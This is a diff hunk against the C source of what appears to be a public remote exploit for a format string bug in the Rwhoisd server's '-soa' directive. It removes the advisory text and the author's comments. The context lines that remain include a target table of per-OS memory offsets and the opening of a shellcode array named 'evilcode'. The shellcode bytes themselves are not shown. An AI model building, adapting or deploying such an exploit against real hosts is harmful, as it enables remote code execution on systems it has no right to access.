@@ -1,36 +1,3 @@
-// source: https://www.securityfocus.com/bid/3474/info
-
-Rwhoisd is a publicly available RWHOIS server daemon for Unix based systems developed and maintained by Network Solutions Inc.
-
-Rwhoisd contains a remotely exploitable format string vulnerability. It is possible to overwrite memory by if a client supplies malicious format specifiers as the argument to the '-soa' directive.
-
-Attackers may be able to execute arbitrary code on affected hosts. 
-
-/* 
-       17.4.2001        
-
-       Remote Exploit for versions of
-       RWhoisd ... (by Network Solutions, Inc. V-1.5.x) 
-      
-       this code exploits a bug in the '-soa' directive 
-       that calls print_error() with a user supplied 
-       format string.
-
-       credit to rob who found the h0le 
-       and mad thanks to all the people who helped me
-       test this code.       
-
-       these versions are vulnerable on all platforms
-       not only the ones available here.
-
-       you better try more than once , for some reason
-       if sometimes fails on first attempts.
-
-       THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY
-       
-       have phun, CowPower.
-       
-*/
 
 #include <signal.h>
 #include <stdlib.h>
@@ -63,8 +30,6 @@ struct version version[] = {
       { "OpenBSD, FreeBSD 4.x",56,-40,324 } , 
  			0
 };
-
-/*  modified shellcodes who contain no nasty control chars (<=0x20)  */
 
 char *evilcode[] = {
 
